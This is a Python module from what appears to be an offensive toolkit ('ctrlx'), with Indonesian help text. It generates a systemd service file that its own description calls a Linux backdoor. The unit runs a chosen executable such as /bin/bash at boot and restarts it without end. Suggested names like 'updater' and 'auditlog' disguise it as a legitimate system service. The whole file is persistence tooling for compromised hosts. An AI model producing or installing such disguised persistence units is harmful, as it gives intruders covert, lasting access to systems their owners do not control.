import argparse
import os

def generate_systemd_service(exec_path, name):
    service_content = f"""[Unit]
Description=System Service ({name})
After=network.target

[Service]
Type=simple
ExecStart={exec_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
    return service_content

def run(raw_args):
    parser = argparse.ArgumentParser(
        prog="ctrlx rda --type sy7d",
        description="Generate systemd service file untuk backdoor Linux",
        epilog="Contoh: python ctrlx.py rda --type sy7d --exec /bin/bash --name updater --save"
    )

    parser.add_argument("--exec", required=True, help="Path executable atau script backdoor")
    parser.add_argument("--name", required=True, help="Nama service (misal: updater, auditlog)")

    args = parser.parse_args(raw_args)
    result = generate_systemd_service(args.exec, args.name)
    return result
